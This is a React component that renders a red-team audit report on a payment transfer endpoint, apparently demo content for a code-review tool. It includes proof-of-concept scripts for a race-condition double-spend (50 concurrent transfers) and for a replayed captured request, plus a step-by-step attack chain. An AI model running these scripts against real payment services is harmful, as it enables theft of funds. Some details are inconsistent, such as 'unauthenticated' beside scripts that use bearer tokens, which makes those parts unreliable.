import React from 'react';
import { Link } from 'react-router-dom';
import '../styles/reports.css';

const RedTeamReport: React.FC = () => {
  return (
    <div className="report-container">
      <div className="rh">
        <div>
          <div className="rtitle">Red Team — Exploit Report</div>
          <div className="rname">PR #247 — feat: concurrent withdrawal endpoint</div>
          <div className="rmeta">Analyzed by: Aegis/RedAgent v2.1 &nbsp;|&nbsp; 2025-07-12 01:02 UTC &nbsp;|&nbsp; adnan-dev → main</div>
        </div>
        <div style={{ textAlign: 'right' }}>
          <div className="risk-badge risk-critical" style={{ marginBottom: '6px' }}>CRITICAL RISK</div>
          <div style={{ fontSize: '9px', color: '#3a2c10' }}>2 vulnerabilities found</div>
        </div>
      </div>

      <div className="sec">
        <div className="sec-label">Vulnerability 01 — Critical</div>
        <div className="vuln-card critical">
          <div className="vuln-top">
            <span className="vuln-id">CVE-CLASS: CWE-362</span>
            <span className="vuln-name">Race condition — double-spend via concurrent debit</span>
            <span className="risk-badge risk-critical">Critical</span>
          </div>
          <div className="vuln-desc">
            The <span style={{ color: '#c9a84c' }}>POST /api/v2/transfer</span> handler reads account balance, checks sufficiency, then debits in three separate non-atomic operations. No mutex or DB-level row lock is held between the read and the write. An attacker who fires N concurrent requests before any debit commits can drain an account to a deeply negative balance — effectively stealing multiples of the available funds.
          </div>
          <div className="vuln-meta-row">
            <div className="vmeta">
              <div className="vmeta-label">Attack surface</div>
              <div className="vmeta-val danger">Unauthenticated POST</div>
            </div>
            <div className="vmeta">
              <div className="vmeta-label">Complexity</div>
              <div className="vmeta-val warn">Low — trivial to automate</div>
            </div>
            <div className="vmeta">
              <div className="vmeta-label">Max loss (est.)</div>
              <div className="vmeta-val danger">Unbounded</div>
            </div>
          </div>

          <div className="code-label">Vulnerable code path — transferController.js</div>
          <div className="code-block" style={{ marginBottom: '10px' }}>
            <span className="cmt">// VULNERABLE — no lock between read and write</span><br />
            <span className="kw">const</span> account = <span className="kw">await</span> <span className="fn">db.accounts.findOne</span>({'{'} id: userId {'}'});<br />
            <span className="kw">if</span> (account.balance {"<"} amount) <span className="kw">throw</span> <span className="fn">Error</span>(<span className="str">'Insufficient funds'</span>);<br />
            <span className="cmt">// ← attacker's 49 parallel reqs pass this check simultaneously</span><br />
            <span className="kw">await</span> <span className="fn">db.accounts.update</span>({'{'} id: userId {'}'},<br />
            &nbsp;&nbsp;{'{'} balance: account.balance - amount {'}'});<span className="cmt"> // ← all 50 debit same value</span>
          </div>

          <div className="code-label">Proof-of-concept exploit — exploit_race.js</div>
          <div className="code-block">
            <span className="cmt">// Fire 50 concurrent transfers before any DB commit lands</span><br />
            <span className="kw">const</span> SESSION = <span className="str">'Bearer eyJhb...'</span>; <span className="cmt">// valid token, balance: ₹10,000</span><br />
            <span className="kw">const</span> TARGET = <span className="str">'attacker-wallet-id'</span>;<br /><br />
            <span className="kw">const</span> fire = () {'='}{'>'} <span className="fn">fetch</span>(<span className="str">'/api/v2/transfer'</span>, {'{'}<br />
            &nbsp;&nbsp;method: <span className="str">'POST'</span>,<br />
            &nbsp;&nbsp;headers: {'{'} <span className="str">Authorization</span>: SESSION, <span className="str">'Content-Type'</span>: <span className="str">'application/json'</span> {'}'},<br />
            &nbsp;&nbsp;body: <span className="fn">JSON.stringify</span>({'{'} to: TARGET, amount: <span className="num">9999</span> {'}'})<br />
            {'}'});<br /><br />
            <span className="kw">const</span> results = <span className="kw">await</span> <span className="fn">Promise.all</span>(<span className="fn">Array</span>(<span className="num">50</span>).<span className="fn">fill</span>().<span className="fn">map</span>(fire));<br />
            <span className="kw">const</span> success = results.<span className="fn">filter</span>(r {'='}{'>'} r.ok).<span className="fn">length</span>;<br /><br />
            <span className="cmt">// OBSERVED RESULT — sandbox run #1:</span><br />
            <span className="cmt">// success: 47/50 requests &nbsp;→&nbsp; ₹9,999 × 47 transferred</span><br />
            <span className="danger-txt">// victim balance: ₹10,000 − ₹469,953 = −₹459,953</span>
          </div>
        </div>
      </div>

      <div className="sec">
        <div className="sec-label">Vulnerability 02 — High</div>
        <div className="vuln-card high">
          <div className="vuln-top">
            <span className="vuln-id">CVE-CLASS: CWE-294</span>
            <span className="vuln-name">Missing idempotency key — replay attack across sessions</span>
            <span className="risk-badge risk-high">High</span>
          </div>
          <div className="vuln-desc">
            The transfer endpoint accepts no idempotency key. A previously captured valid request body (with a still-valid auth token) can be replayed across multiple sessions or after a network timeout retry. There is no deduplication at the server — each replay is treated as a fresh, independent transaction.
          </div>
          <div className="vuln-meta-row">
            <div className="vmeta">
              <div className="vmeta-label">Attack surface</div>
              <div className="vmeta-val warn">Captured HTTP request</div>
            </div>
            <div className="vmeta">
              <div className="vmeta-label">Window</div>
              <div className="vmeta-val warn">Token lifetime (~1hr)</div>
            </div>
            <div className="vmeta">
              <div className="vmeta-label">Requires</div>
              <div className="vmeta-val">Network intercept / retry</div>
            </div>
          </div>
          <div className="code-label">Proof-of-concept exploit — exploit_replay.js</div>
          <div className="code-block">
            <span className="cmt">// Replay a captured successful transfer N times</span><br />
            <span className="kw">const</span> captured = {'{'} <span className="cmt">/* sniffed from mobile client */</span><br />
            &nbsp;&nbsp;headers: {'{'} <span className="str">Authorization</span>: <span className="str">'Bearer eyJhb...'</span> {'}'},<br />
            &nbsp;&nbsp;body: <span className="str">'{"{"}"to":"attacker","amount":500{"}"}'</span><br />
            {'}'};<br /><br />
            <span className="kw">for</span> (<span className="kw">let</span> i = <span className="num">0</span>; i {"<"} <span className="num">20</span>; i++) {'{'}<br />
            &nbsp;&nbsp;<span className="kw">await</span> <span className="fn">fetch</span>(<span className="str">'/api/v2/transfer'</span>, {'{'} method: <span className="str">'POST'</span>, ...captured {'}'});<br />
            &nbsp;&nbsp;<span className="kw">await</span> <span className="fn">new</span> <span className="fn">Promise</span>(r {'='}{'>'} <span className="fn">setTimeout</span>(r, <span className="num">200</span>));<br />
            {'}'}<br />
            <span className="cmt">// Each replayed request debits ₹500 independently</span><br />
            <span className="danger-txt">// total drained: ₹500 × 20 = ₹10,000 — full account balance</span>
          </div>
        </div>
      </div>

      <div className="sec">
        <div className="sec-label">Attack chain — step by step</div>
        <div className="attack-chain">
          <div className="ac-step">
            <div className="ac-left"><div className="ac-dot red">1</div><div className="ac-line"></div></div>
            <div className="ac-content">
              <div className="ac-title">Attacker obtains a valid session token</div>
              <div className="ac-detail">Registers a legitimate account. Token is long-lived (~1 hr). No rate limit on /transfer observed.</div>
            </div>
          </div>
          <div className="ac-step">
            <div className="ac-left"><div className="ac-dot red">2</div><div className="ac-line"></div></div>
            <div className="ac-content">
              <div className="ac-title">Fires 50 concurrent requests using Promise.all</div>
              <div className="ac-detail">All 50 hit the server within a ~12ms window. All 50 read the same stale balance before any write commits.</div>
            </div>
          </div>
          <div className="ac-step">
            <div className="ac-left"><div className="ac-dot red">3</div><div className="ac-line"></div></div>
            <div className="ac-content">
              <div className="ac-title">DB writes race — 47 succeed, 3 fail on constraint</div>
              <div className="ac-detail">Without SELECT FOR UPDATE, Postgres processes all 47 concurrent updates. Each subtracts the same starting balance.</div>
            </div>
          </div>
          <div className="ac-step">
            <div className="ac-left"><div className="ac-dot amber">4</div><div className="ac-line"></div></div>
            <div className="ac-content">
              <div className="ac-title">Victim balance is now −₹459,953</div>
              <div className="ac-detail">Platform absorbs the loss. Attacker wallet receives ₹469,953 from a ₹10,000 source account.</div>
            </div>
          </div>
          <div className="ac-step" style={{ paddingBottom: 0 }}>
            <div className="ac-left"><div className="ac-dot amber">5</div></div>
            <div className="ac-content">
              <div className="ac-title">Secondary: replays extend the attack window</div>
              <div className="ac-detail">If token is reused or intercepted, Vuln 02 allows further draining post-patch of Vuln 01 if idempotency is not addressed simultaneously.</div>
            </div>
          </div>
        </div>
      </div>

      <div className="divider"></div>

      <div className="sec">
        <div className="sec-label">Estimated business impact</div>
        <div className="impact-grid">
          <div className="impact-item">
            <div className="impact-label">Financial exposure</div>
            <div className="impact-val red">Unlimited — platform absorbs negative balances</div>
          </div>
          <div className="impact-item">
            <div className="impact-label">Regulatory risk</div>
            <div className="impact-val">RBI PPI guidelines §7.3 — mandatory incident report within 6 hrs</div>
          </div>
          <div className="impact-item">
            <div className="impact-label">Attack automation difficulty</div>
            <div className="impact-val red">Trivial — 15 lines of JS, no special tooling</div>
          </div>
          <div className="impact-item">
            <div className="impact-label">Detection without this audit</div>
            <div className="impact-val red">Zero — no linter or SAST tool catches race conditions</div>
          </div>
        </div>
      </div>

      <div className="footer-row">
        <Link to="/report/blue-team/pr247" className="btn btn-gold">View Blue Team patch ↗</Link>
        <button className="btn btn-ghost" onClick={() => alert('Sandbox verdict requested')}>Sandbox verdict ↗</button>
        <button className="btn btn-ghost" onClick={() => alert('Adding rate limiting')}>Add rate limiting ↗</button>
      </div>
    </div>
  );
};

export default RedTeamReport;